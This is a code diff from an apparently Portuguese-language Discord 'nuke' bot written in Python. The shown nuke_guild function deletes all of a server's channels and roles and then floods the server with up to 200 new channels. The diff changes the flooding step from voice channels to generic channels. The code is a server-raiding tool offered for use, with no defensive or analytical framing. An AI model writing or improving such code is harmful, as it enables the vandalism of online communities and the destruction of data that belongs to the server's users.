@@ -66,11 +66,11 @@ async def create_roles(guild, name):
             continue
     return created
 
-async def create_voice_channels(guild, name):
+async def create_channels(guild, name):
     created = 0
     for _ in range(200 - len(guild.channels)):
         try:
-            await guild.create_voice_channel(name=name)
+            await guild.create_channel(name=name)
             created += 1
         except:
             continue
@@ -84,8 +84,8 @@ async def nuke_guild(guild):
     print(f'{m}𝐃𝐄𝐋𝐀𝐓𝐀𝐑 𝐂𝐀𝐍𝐀𝐋:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}𝐃𝐄𝐋𝐄𝐓𝐀𝐑 𝐑𝐎𝐋𝐄𝐒:{b}{delete_roles}')
-    created_channels = await create_voice_channels(guild,name)
-    print(f'{m}𝐂𝐑𝐈𝐖𝐑 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐕𝐎𝐙:{b}{created_channels}')
+    created_channels = await create_channels(guild,name)
+    print(f'{m}𝐂𝐑𝐈AR 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐕𝐎𝐙:{b}{created_channels}')
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
